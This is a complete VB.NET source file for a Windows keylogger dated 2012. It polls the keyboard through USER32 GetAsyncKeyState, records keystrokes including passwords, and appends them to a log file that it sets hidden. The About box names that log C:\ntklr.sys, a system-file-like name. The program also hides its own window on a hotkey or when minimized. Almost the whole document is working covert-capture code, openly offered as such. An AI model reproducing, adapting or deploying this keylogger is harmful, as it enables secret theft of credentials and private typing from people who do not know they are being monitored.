' libraries
Imports System.Runtime.InteropServices
Imports System.Threading
Imports System.IO

Public Class frmKeylogger
    ' declarations
    Dim buffer As New List(Of String)
    Dim buffercat As String
    Dim stagingpoint As String
    Dim actual As String
    Dim initlog As Boolean = False
    Dim log As StreamWriter

    ' threading
    Public thread_scan As Thread
    Public thread_hide As Thread

    ' thread-safe calling for thread_hide
    Delegate Sub Change()
    Dim objchange As New Change(AddressOf DoHide)


    Private Sub frmKeyRogger_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.Text = "Keylogger"
        lblTitle1.Text = "capablemonkey's"
        lblTitle2.Text = "Keylogger"
        lblAbout.Text = "About"

        GroupBox1.Text = "Control Panel"
        cmdBegin.Text = "Start"
        cmdEnd.Text = "End"
        cmdEnd.Enabled = False
        cmdClear.Text = "Clear"

        'initiate hide thread
        thread_hide = New Thread(AddressOf HideIt)
        thread_hide.IsBackground = True
        thread_hide.Start()

        status.Text = "Ready"
    End Sub

    ' write out keystroke log to file on close event
    Private Sub frmKeyRogger_Closed(ByVal sender As Object, ByVal e As System.EventArgs) Handles MyBase.Closed
        Call WriteOut()
    End Sub


    ' getkey, API call to USER32.DLL
    <DllImport("USER32.DLL", EntryPoint:="GetAsyncKeyState", SetLastError:=True,
    CharSet:=CharSet.Unicode, ExactSpelling:=True,
    CallingConvention:=CallingConvention.StdCall)>
    Public Shared Function getkey(ByVal Vkey As Integer) As Boolean
    End Function


    Private Sub cmdBegin_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdBegin.Click

        thread_scan = New Thread(AddressOf Scan)
        thread_scan.IsBackground = True
        thread_scan.Start()
        cmdBegin.Enabled = False

        If chkFile.Checked = True Then
            Try
                log = New StreamWriter(OpenFileDialog.FileName, True)
            Catch
                MsgBox("Could not open file for writing.  Perhaps it is read only, non-existant, or you lack necessary privileges to access it?")
            End Try
        End If

        status.Text = "Logging keystrokes..."

        cmdEnd.Enabled = True
    End Sub

    ' checks for keypresses with delay, upon detection of pressed key, calls AddToBuffer
    Public Sub Scan()
        Dim foo As Integer
        While 1

            For foo = 1 To 93 Step 1
                If getkey(foo) Then
                    AddtoBuffer(foo, getkey(16))
                End If
            Next

            For foo = 186 To 192 Step 1
                If getkey(foo) Then
                    AddtoBuffer(foo, getkey(16))
                End If
            Next

            BufferToOutput()
            buffer.Clear()

            Thread.Sleep(120)
            SetText(stagingpoint)
        End While
    End Sub


    ' parses keycode and saves to buffer to be written
    Public Sub AddtoBuffer(ByVal foo As Integer, ByVal modifier As Boolean)
        If Not (foo = 1 Or foo = 2 Or foo = 8 Or foo = 9 Or foo = 13 Or (foo >= 17 And foo <= 20) Or foo = 27 Or (foo >= 32 And foo <= 40) Or (foo >= 44 And foo <= 57) Or (foo >= 65 And foo <= 93) Or (foo >= 186 And foo <= 192)) Then
            Exit Sub
        End If

        Select Case foo
            Case 48 To 57
                If modifier Then
                    Select Case foo
                        Case 48
                            actual = ")"
                        Case 49
                            actual = "!"
                        Case 50
                            actual = "@"
                        Case 51
                            actual = "#"
                        Case 52
                            actual = "$"
                        Case 53
                            actual = "%"
                        Case 54
                            actual = "^"
                        Case 55
                            actual = "&"
                        Case 56
                            actual = "*"
                        Case 57
                            actual = "("
                    End Select
                Else
                    actual = Convert.ToChar(foo)
                End If
            Case 65 To 90
                If modifier Then
                    actual = Convert.ToChar(foo)
                Else
                    actual = Convert.ToChar(foo + 32)
                End If
            Case 1
                'actual = "<LCLICK>"
                actual = ""
            Case 2
                actual = "<RCLICK>"
            Case 8
                actual = "<BACKSPACE>"
            Case 9
                actual = "<TAB>"
            Case 13
                actual = "<ENTER>"
            Case 17
                actual = "<CTRL>"
            Case 18
                actual = "<ALT>"
            Case 19
                actual = "<PAUSE>"
            Case 20
                actual = "<CAPSLOCK>"
            Case 27
                actual = "<ESC>"
            Case 32
                actual = " "
            Case 33
                actual = "<PAGEUP>"
            Case 34
                actual = "<PAGEDOWN>"
            Case 35
                actual = "<END>"
            Case 36
                actual = "<HOME>"
            Case 37
                actual = "<LEFT>"
            Case 38
                actual = "<UP>"
            Case 39
                actual = "<RIGHT>"
            Case 40
                actual = "<DOWN>"
            Case 44
                actual = "<PRNTSCRN>"
            Case 45
                actual = "<INSERT>"
            Case 46
                actual = "<DEL>"
            Case 47
                actual = "<HELP>"
            Case 186
                If modifier Then
                    actual = ":"
                Else
                    actual = ";"
                End If
                actual = ";"

            Case 187
                If modifier Then
                    actual = "+"
                Else
                    actual = "="
                End If
            Case 188
                If modifier Then
                    actual = "<"
                Else
                    actual = ","
                End If
            Case 189
                If modifier Then
                    actual = "_"
                Else
                    actual = "-"
                End If
            Case 190
                If modifier Then
                    actual = ">"
                Else
                    actual = "."
                End If
            Case 191
                If modifier Then
                    actual = "?"
                Else
                    actual = "/"
                End If
            Case 192
                If modifier Then
                    actual = "~"
                Else
                    actual = "`"
                End If
        End Select

        If buffer.Count <> 0 Then
            Dim bar As Integer = 0
            While bar < buffer.Count
                If buffer(bar) = actual Then
                    Exit Sub
                End If
                bar += 1
            End While
        End If

        buffer.Add(actual)


    End Sub

    ' writes buffer to output box
    Public Sub BufferToOutput()
        If buffer.Count <> 0 Then
            Dim qux As Integer = 0
            While qux < buffer.Count
                buffercat = buffercat & buffer(qux)
                qux += 1
            End While
            'SetText(txtOutput.Text & buffercat)
            stagingpoint = stagingpoint & buffercat
            buffercat = String.Empty
        End If
    End Sub

    Delegate Sub SetTextCallback(ByVal [text] As String)

    ' thread safe call to output text to output box
    Private Sub SetText(ByVal [text] As String)
        If txtOutput.InvokeRequired Then
            Dim d As New SetTextCallback(AddressOf SetText)
            Me.Invoke(d, New Object() {[text]})
        Else
            txtOutput.Text = [text]
        End If
    End Sub

    Private Sub cmdEnd_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdEnd.Click
        thread_scan.Abort()
        buffer.Clear()
        cmdBegin.Enabled = True
        cmdEnd.Enabled = False
        Call WriteOut()
        status.Text = "Stopped logging."
    End Sub

    Private Sub cmdClear_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdClear.Click
        txtOutput.Clear()
        stagingpoint = String.Empty
    End Sub


    Private Sub lblAbout_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles lblAbout.Click
        MsgBox("Written by capablemonkey (c) 2012" & vbNewLine & "contact: technix1@gmail.com" & vbNewLine & "blog: capablemonkey.blogspot.com" & vbNewLine & "Revision 3/31/2012" & vbNewLine & vbNewLine & "Press ctrl+shift+s to hide and unhide me!" & vbNewLine & "Log file stored in C:\ntklr.sys.", , "About")
    End Sub


    Private Sub frmKeyRogger_Resize(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Resize
        If Me.WindowState = FormWindowState.Minimized Then
            Me.Hide()
        End If
    End Sub

    Public Sub WriteOut()
        If chkFile.Checked = False Then
            Exit Sub
        End If
        Dim tm As System.DateTime
        tm = Now

        Try
            log.WriteLine(vbNewLine)
        Catch
            log = New StreamWriter(OpenFileDialog.FileName, True)
        End Try
        log.WriteLine(tm)
        If stagingpoint <> Nothing Then
            log.WriteLine(stagingpoint)
        End If
        log.WriteLine(vbNewLine)
        log.Flush()
        log.Close()


        'hides file/sets as hidden
        File.SetAttributes(OpenFileDialog.FileName, FileAttributes.Hidden)
    End Sub

    ' ctrl+shift+s toggles hide form
    Public Sub HideIt()
        While 1
            If getkey(17) And getkey(160) And getkey(83) Then
                Me.Invoke(objchange)
            End If
            Thread.Sleep(200)
        End While
    End Sub

    Public Sub DoHide()
        If Me.Visible = True Then
            Me.Visible = False
        Else
            Me.Visible = True
        End If
    End Sub

    Private Sub chkFile_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles chkFile.CheckedChanged
        If chkFile.Checked = True Then
            OpenFileDialog.ShowDialog()
        End If
    End Sub
End Class
